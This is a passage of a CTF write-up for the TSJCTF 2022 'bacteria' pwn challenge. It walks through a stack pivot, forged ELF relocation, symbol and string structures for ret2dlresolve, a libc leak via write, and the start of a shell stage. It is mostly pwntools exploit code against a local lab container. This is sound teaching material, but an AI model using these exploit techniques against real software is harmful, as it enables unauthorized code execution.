</span><span class="code-line">		<span class="token keyword">if</span> <span class="token string">b&#x27;/home/bacteria/bacteria&#x27;</span> <span class="token keyword">in</span> i <span class="token keyword">and</span> <span class="token string">b&#x27;timeout&#x27;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>
</span><span class="code-line">			<span class="token comment"># Change the split to get the correct pid</span>
</span><span class="code-line">			pid <span class="token operator">=</span> i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b&#x27;    &#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b&#x27;  &#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">			log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#x27;Process pid: &#x27;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">	command <span class="token operator">=</span> <span class="token triple-quoted-string string">&#x27;&#x27;&#x27;
</span></span><span class="code-line"><span class="token triple-quoted-string string">	b*0x401040
</span></span><span class="code-line"><span class="token triple-quoted-string string">	c
</span></span><span class="code-line"><span class="token triple-quoted-string string">	&#x27;&#x27;&#x27;</span>
</span><span class="code-line">	<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#x27;/tmp/command.gdb&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;wt&#x27;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
</span><span class="code-line">	        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
</span><span class="code-line">	subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#x27;sudo&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;--geometry&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;960x1080+960+0&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;-e&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;gdb&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;-p&#x27;</span><span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token string">&#x27;-x&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;/tmp/command.gdb&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span><span class="code-line">	<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token comment"># input() to make program wait with gdb</span>
</span><span class="code-line">
</span><span class="code-line">p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">&#x27;127.0.0.1&#x27;</span><span class="token punctuation">,</span> <span class="token number">9487</span><span class="token punctuation">)</span>
</span><span class="code-line">GDB<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div></p></details>
<p>And remember these GDB command to check for JMPREL, SYMTAB and STRTAB:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/3xg   (JMPREL) + (reloc_arg) * 24
</span><span class="code-line">gef➤  p/x     (r_info) &gt;&gt; 32     # symbol_number
</span><span class="code-line">gef➤  x/3xg   (SYMTAB) + (symbol_number) * 24
</span><span class="code-line">gef➤  x/s     (STRTAB) + (st_name)
</span></code></pre></div>
<hr/>
<h3 id="stage-1-stack-pivot"><a href="#stage-1-stack-pivot" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 1: Stack pivot</h3>
<p>First, let’s attach gdb to the process of bacteria in the container to get the read &amp; write section so that we can do stack pivot:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/get_rw_section.png" alt="get_rw_section.png"/></p>
<p>So we know that at address from <code>0x403000</code> to <code>0x404000</code>, the binary is writable. So we will choose an address of <code>0x403e00</code> to stack pivot. Why I choose <code>0x403e00</code>, because after the stack pivot, we will conduct the ret2dlresolve, which will need a lot of lower memory to resolve libc address. Choosing <code>0x403e00</code> so we don’t need to change a lot.</p>
<p>To do the stack pivot, we also need a <code>leave; ret</code> gadget to change the rsp. But because we will execute the <code>.text</code> again so we have <code>leave; ret</code> already. One more thing to notice is that after we stack pivot, the new stack now is inside the binary which doesn’t have any thing for us to work around. So before we do the stack pivot, we need to write something to the chosen address first.</p>
<p>As we know that the program will first mov the current rsp to rbp and then mov rbp to rsi and write to rsi. So we just need <code>mov rsi, rbp</code> to write to our desired address passed to rsi by rbp. Our first payload will be as following:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">rw_section <span class="token operator">=</span> <span class="token number">0x403e00</span>
</span><span class="code-line">mov_rsi_rbp_read <span class="token operator">=</span> <span class="token number">0x401027</span>
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>                 <span class="token comment"># Just for padding so that we don’t need to sleep()</span>
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>Running script and we stop at ret, we can see that it’s ready for the next input of 0x20 bytes to the rw_section (by looking at rbp)</p>
<p>Status of rbp:
<img src="/static/images/tsjctf-2022/bacteria/rw_section_rbp.png" alt="rw_section_rbp.png"/></p>
<p>Status of code:
<img src="/static/images/tsjctf-2022/bacteria/rw_section_code.png" alt="rw_section_code.png"/></p>
<p>That’s look good! Just leave it here for a while and we will continue building exploit later.</p>
<h3 id="stage-2-fake-address-and-structure-of-elf64_sym"><a href="#stage-2-fake-address-and-structure-of-elf64_sym" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 2: Fake address and structure of Elf64_Sym</h3>
<p>The reason why I fake Elf64_Sym structure first is because with the address of Elf64_Sym structure, we can calculate the symbol_number and the other stuff.</p>
<p>So first, we will choose an address for Elf64_Sym so that <code>symbol_numer</code> is an integer:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">    &lt;Address of Elf64_Sym&gt; = &lt;SYMTAB&gt; + &lt;symbol_number&gt; * 24
</span><span class="code-line">&lt;=&gt; &lt;symbol_number&gt; = ( &lt;Address of Elf64_Sym&gt; - &lt;SYMTAB&gt; ) / 24
</span></code></pre></div>
<p>After a first trying, we know that we can use the address of rw_section to write our fake Elf64_Sym struct. So now we have:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">SYMTAB = 0x400290
</span><span class="code-line">Elf64_Sym_addr  = rw_section                             = 0x403e00
</span><span class="code-line">symbol_number   = int(( Elf64_Sym_addr - SYMTAB ) / 24)  = 634
</span></code></pre></div>
<p>Now, we will create a fake struct for Elf64_Sym. The structure of Elf64_Sym is defined as follows:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">elf64_sym</span> <span class="token punctuation">{</span>
</span><span class="code-line">    Elf64_Word st_name<span class="token punctuation">;</span>       <span class="token comment">/* Symbol name, index in string table (4 bytes)*/</span>
</span><span class="code-line">    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span>    <span class="token comment">/* Type and binding attributes (1 bytes) */</span>
</span><span class="code-line">    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span>   <span class="token comment">/* No defined meaning, 0 (1 bytes) */</span>
</span><span class="code-line">    Elf64_Half st_shndx<span class="token punctuation">;</span>      <span class="token comment">/* Associated section index (2 bytes) */</span>
</span><span class="code-line">    Elf64_Addr st_value<span class="token punctuation">;</span>      <span class="token comment">/* Value of the symbol (8 bytes) */</span>
</span><span class="code-line">    Elf64_Xword st_size<span class="token punctuation">;</span>      <span class="token comment">/* Associated symbol size (8 bytes) */</span>
</span><span class="code-line"><span class="token punctuation">}</span> Elf64_Sym<span class="token punctuation">;</span>
</span></code></pre></div>
<p>The variable we want to fake here is st_name and we just keep the others same as Elf64_Sym of read:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/read_fake_keep.png" alt="read_fake_keep.png"/></p>
<p>But because our space is limited so we cannot write the struct in 0x10 bytes, the other 0x10 bytes will be use to control the flow. So our Elf64_Sym_Struct would be like this:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">st_name <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>        <span class="token comment"># Unknown, temporary</span>
</span><span class="code-line">st_info <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>
</span><span class="code-line">st_other <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">st_shndx <span class="token operator">=</span> p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">st_value <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># st_size is null already because the stack now contain all null byte</span>
</span><span class="code-line"><span class="token comment"># so we don’t need to write these variable, just need to pad full 0x10</span>
</span><span class="code-line"><span class="token comment"># bytes so that we don’t need to sleep()</span>
</span><span class="code-line">Elf64_Sym_struct <span class="token operator">=</span> st_name <span class="token operator">+</span> st_info <span class="token operator">+</span> st_other <span class="token operator">+</span> st_shndx
</span></code></pre></div>
<p>Because we haven’t build up structure for STRTAB so st_name will be <code>0xdeadbeef</code>, just temporary and will change when STRTAB is finished. Now we will leave it here and continue with the second struct: Elf64_Rela!</p>
<h3 id="stage-3-fake-address-and-structure-of-elf64_rela"><a href="#stage-3-fake-address-and-structure-of-elf64_rela" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 3: Fake address and structure of Elf64_Rela</h3>
<p>First, we will need the address for Elf64_Rela struct to make <code>reloc_arg</code> is an integer with the following calculation:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">    &lt;Address of Elf64_Rela&gt; = &lt;JMPREL&gt; + &lt;reloc_arg&gt; * 24
</span><span class="code-line">&lt;=&gt; &lt;reloc_arg&gt; = ( &lt;Address of Elf64_Rela&gt; - &lt;JMPREL&gt; ) / 24
</span></code></pre></div>
<p>After a while trying various address, the address of Elf64_Rela will be <code>rw_section + 0x40</code> and we have the following stuffs:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">JMPREL = 0x400300
</span><span class="code-line">Elf64_Rela_addr  = rw_section + 0x40                      = 0x403e40
</span><span class="code-line">reloc_arg        = int(( Elf64_Rela_addr - JMPREL) / 24)  = 632
</span></code></pre></div>
<p>Now we will create the structure for Elf64_Rela which is defined as follows:</p>
<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">elf64_rela</span> <span class="token punctuation">{</span>
</span><span class="code-line">    Elf64_Addr r_offset<span class="token punctuation">;</span>      <span class="token comment">/* Location at which to apply the action (8 bytes) */</span>
</span><span class="code-line">    Elf64_Xword r_info<span class="token punctuation">;</span>       <span class="token comment">/* index and type of relocation (8 bytes) */</span>
</span><span class="code-line">    Elf64_Sxword r_addend<span class="token punctuation">;</span>    <span class="token comment">/* Constant addend used to compute value (8 bytes) */</span>
</span><span class="code-line"><span class="token punctuation">}</span> Elf64_Rela<span class="token punctuation">;</span>
</span></code></pre></div>
<p>We will fake r_offset and r_info while r_addend is the same with .rela.plt of read, which is null byte:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/read_JMPREL_GDB.png" alt="read_JMPREL_GDB.png"/></p>
<p>So our struct for Elf64_Rela will be as following:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">r_offset <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>         <span class="token comment"># Unknown, temporary</span>
</span><span class="code-line">r_info <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>symbol_number <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># r_addend is null and stack is null already so we don’t need to write this,</span>
</span><span class="code-line"><span class="token comment"># also because we run out of 0x10 bytes we can write</span>
</span><span class="code-line">Elf64_Rela_struct <span class="token operator">=</span> r_offset <span class="token operator">+</span> r_info
</span></code></pre></div>
<p>We know that r_offset is the place which contains the resolved libc address so we will chose the address for that later. Now we will move to the last thing we need to fake: STRTAB.</p>
<h3 id="stage-4-fake-address-and-structure-of-strtab"><a href="#stage-4-fake-address-and-structure-of-strtab" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 4. Fake address and structure of STRTAB</h3>
<p>As 2 part above does at the begining, we will choose the address for STRTAB first. This address also have to satisfy this calculation:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">    &lt;Address for STRTAB&gt; = &lt;STRTAB&gt; + &lt;st_name&gt;
</span><span class="code-line">&lt;=&gt; &lt;st_name&gt; = &lt;Address for STRTAB&gt; - &lt;STRTAB&gt;
</span></code></pre></div>
<p>So this is easier because we don’t have a division in the calculation. So we will choose any address which doesn’t overwrite the other data:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">STRTAB_addr  = rw_section + 0x80     = 0x403e80
</span><span class="code-line">st_name      = STRTAB_addr - STRTAB  = 15296
</span></code></pre></div>
<p>And the struct for STRTAB is just simply a string contain the function we want:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">STRTAB_struct <span class="token operator">=</span> <span class="token string">b&#x27;system\x00\x00&#x27;</span>
</span><span class="code-line">STRTAB_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>              <span class="token comment"># Just for padding so we don’t need to sleep() when read</span>
</span></code></pre></div>
<p>From here, we have 2 things we haven’t done is st_name of Elf64_Sym and r_offset of Elf64_Rela. For st_name, we can get that from STRTAB above so stage 2 will change like this:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">SYMTAB <span class="token operator">=</span> <span class="token number">0x400290</span>
</span><span class="code-line">
</span><span class="code-line">Elf64_Sym_addr <span class="token operator">=</span> rw_section
</span><span class="code-line">symbol_number  <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>Elf64_Sym_addr <span class="token operator">-</span> SYMTAB<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">24</span> <span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">st_name <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">15296</span><span class="token punctuation">)</span>        <span class="token comment"># Change here</span>
</span><span class="code-line">st_info <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>
</span><span class="code-line">st_other <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">st_shndx <span class="token operator">=</span> p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line">st_value <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># st_size is null already because the stack now contain all null byte</span>
</span><span class="code-line"><span class="token comment"># so we don’t need to write these variable, just need to pad full 0x10</span>
</span><span class="code-line"><span class="token comment"># bytes so that we don’t need to sleep()</span>
</span><span class="code-line">Elf64_Sym_struct <span class="token operator">=</span> st_name <span class="token operator">+</span> st_info <span class="token operator">+</span> st_other <span class="token operator">+</span> st_shndx <span class="token operator">+</span> st_value
</span></code></pre></div>
<p>And for r_offset, we just leave it as <code>0xdeadbeef</code> and will change that after checking the stack. So now we just move to the next stage to know if our struct are in the correct position or not.</p>
<h3 id="stage-5-conduct-ret2dlresolve--leak-libc-address"><a href="#stage-5-conduct-ret2dlresolve--leak-libc-address" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 5. Conduct ret2dlresolve &amp; Leak libc address</h3>
<p>We have the address for each struct so now just write stuff to stack. Remember where we stopped was at the stage 1 with the following code:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">rw_section <span class="token operator">=</span> <span class="token number">0x403e00</span>
</span><span class="code-line">mov_rsi_rbp_read <span class="token operator">=</span> <span class="token number">0x401027</span>
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section<span class="token punctuation">)</span>           <span class="token comment"># Fake rbp</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>    <span class="token comment"># rip</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>                   <span class="token comment"># Just for padding so that we don’t need to sleep()</span>
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>So we will need to change the place we stack pivot because we want to write Elf64_Sym at the same time we stack pivot so our first stage will change a bit at the fake rbp:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">rw_section <span class="token operator">=</span> <span class="token number">0x403e00</span>
</span><span class="code-line">mov_rsi_rbp_read <span class="token operator">=</span> <span class="token number">0x401027</span>
</span><span class="code-line">
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment"># Fake rbp</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>    <span class="token comment"># rip</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>                   <span class="token comment"># Just for padding so that we don’t need to sleep()</span>
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>Because we want the Elf64_Sym structure is placed at the correct address so we subtract with 0x10 so that in the next input, we will write the first 0x10 of fake rbp and rip, then the next 0x10 is the Elf64_Sym in the correct address. And when it read for the second time, which means it’s reading to the address of rw_section - 0x10. So we will write the ELf64_Sym struct to here with following code:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment"># Write Elf64_Sym structure</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>Elf64_Rela_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    <span class="token comment"># Fake rbp, write and jump to Elf64_Rela address</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> Elf64_Sym_struct
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>And with the next input, it will read to the address of <code>Elf64_Rela_addr - 0x10</code> so we will write the Elf64_Rela structure with the following code:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment"># Write Elf64_Rela structure</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>STRTAB_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>        <span class="token comment"># Fake rbp, write and jump to STRTAB address</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> Elf64_Rela_struct
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>And with the next read(), it will write to the STRTAB address so we have the following code:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment"># Write STRTAB structure</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                         <span class="token comment"># Check first, change later</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> STRTAB_struct
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>We will get the reloc_arg to check if all the structures are set properly or not:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token keyword">print</span><span class="token punctuation">(</span>reloc_arg<span class="token punctuation">)</span>
</span></code></pre></div>
<p>and run with GDB attached for debuging:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/check_reloc_arg.png" alt="check_reloc_arg.png"/></p>
<p>We can see that it send 0x20 bytes which fit read() so we are sure that every payload is sent correctly. Let’s run until we have inputed all struct and check with the reloc_arg:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/check_structures_position.png" alt="check_structures_position.png"/></p>
<p>We can see that all of our struct are in the correct position. Now we just need an address of r_offset to puts the resolved function to it. We want when it has just resolved, it will print out the resolved address immediately. Which means when we have just write STRTAB structure, we will write the dlresolver to r_offset. After it resolve, it will print out the libc address which rsi is holding the pointer.</p>
<p>So the dlresolver and r_offset is in the same address. Because we don’t want the JMPREL, SYMTAB and STRTAB structure to be overwriten or it might cause error. And also because dlresolve will use the lower stack address to resolve this so choosing lower address is an great idea. We will use address of <code>rw_section - 0x50</code> for both r_offset and dlresolver so the stage 3 will change to this:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">JMPREL <span class="token operator">=</span> <span class="token number">0x400300</span>
</span><span class="code-line">
</span><span class="code-line">Elf64_Rela_addr <span class="token operator">=</span> rw_section <span class="token operator">+</span> <span class="token number">0x40</span>
</span><span class="code-line">reloc_arg <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>Elf64_Rela_addr <span class="token operator">-</span> JMPREL<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">24</span> <span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line">r_offset <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section <span class="token operator">-</span> <span class="token number">0x50</span><span class="token punctuation">)</span>         <span class="token comment"># Change here</span>
</span><span class="code-line">r_info <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>symbol_number <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token comment"># r_addend is null and stack is null already so we don’t need to write this,</span>
</span><span class="code-line"><span class="token comment"># also because we run out of 0x10 bytes we can write</span>
</span><span class="code-line">Elf64_Rela_struct <span class="token operator">=</span> r_offset <span class="token operator">+</span> r_info
</span></code></pre></div>
<p>And the rbp when writing STRTAB structure become this:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment"># Write STRTAB structure</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rw_section <span class="token operator">-</span> <span class="token number">0x50</span><span class="token punctuation">)</span>         <span class="token comment"># Fake rbp, write and jump to ret2dlresolve address</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> STRTAB_struct
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>Everything is set! Now we will conduct the ret2dlresolve by faking reloc_arg. To do that, we will need 3 things placed on stack: dlresolver address, reloc_arg and return address. The dlresolver address we can get by analize the read@plt:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/analize_read_plt.png" alt="analize_read_plt.png"/></p>
<p>So the dlresolver address is <code>0x401000</code>, the reloc_arg is <code>632</code> above and the return address of course is <code>mov_rsi_rbp_read</code> because we will need to input something more.</p>
<p>After it writes STRTAB structure and jump to there, it then write to ret2dlresolve stack address and jump to ret2dlresolve address. With everything we have, the payload will look like this:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">dlresolver <span class="token operator">=</span> <span class="token number">0x401000</span>
</span><span class="code-line">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                         <span class="token comment"># Fake rbp</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>dlresolver<span class="token punctuation">)</span>               <span class="token comment"># Resolve then execute resolved function</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>reloc_arg<span class="token punctuation">)</span>
</span><span class="code-line">payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rsi_rbp_read<span class="token punctuation">)</span>
</span><span class="code-line">p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>Wait! The hint was we can use <code>write(0, buf, numofbyte)</code> to print things out (rdi is always 0) so in the STRTAB structure, we will change from <code>system</code> to <code>write</code> to print out the resolved libc address. This is the updated of STRTAB structure:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line">STRTAB <span class="token operator">=</span> <span class="token number">0x4002c0</span>
</span><span class="code-line">
</span><span class="code-line">STRTAB_addr <span class="token operator">=</span> rw_section <span class="token operator">+</span> <span class="token number">0x80</span>
</span><span class="code-line">st_name <span class="token operator">=</span> STRTAB_addr <span class="token operator">-</span> STRTAB
</span><span class="code-line">
</span><span class="code-line">STRTAB_struct <span class="token operator">=</span> <span class="token string">b&quot;write\x00\x00\x00&quot;</span>
</span><span class="code-line">STRTAB_struct <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Running script to here and debug with gdb, we know we ret2dlresolve successfully:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/get_write_libc_function.png" alt="get_write_libc_function.png"/></p>
<p>This is the function write in libc. Let’s check if the rsi contain the address point to r_offset or not:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/rsi_contain_write_libc_address.png" alt="rsi_contain_write_libc_address.png"/></p>
<p>And here it is! Running through the write function and we get the address of write leaked:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/write_address_leaked.png" alt="write_address_leaked.png"/></p>
<p>Getting that leak and parsing it with the following code, we can get the libc base address:</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token comment"># Get leaked address</span>
</span><span class="code-line">write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&#x27;Leak address: &#x27;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> <span class="token number">0x1111d0</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&#x27;Libc base: &#x27;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Running script and we get this output:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/get_libc_base.png" alt="get_libc_base.png"/></p>
<p>Check with libc in GDB and we get the same address:</p>
<p><img src="/static/images/tsjctf-2022/bacteria/get_libc_base_GDB.png" alt="get_libc_base_GDB.png"/></p>
<p>What a long way! Let’s keep going cause we are very close to flag.</p>
<h3 id="stage-6-get-shell"><a href="#stage-6-get-shell" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 6. Get shell</h3>
<p>Now we will get the libc from container to our host and then find one gadget from it:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ <span class="token function">docker</span> <span class="token function">ps</span>
</span><span class="code-line">CONTAINER ID   IMAGE               COMMAND                  CREATED        STATUS       PORTS                    NAMES
</span><span class="code-line">3ac3689e6140   bacteria_bacteria   <span class="token string">&quot;/usr/sbin/xinetd -d…&quot;</span>   <span class="token number">12</span> hours ago   Up <span class="token number">3</span> hours   <span class="token number">0.0</span>.0.0:9487-<span class="token operator">&gt;</span><span class="token number">9487</span>/tcp   bacteria_bacteria_1
</span><span class="code-line">
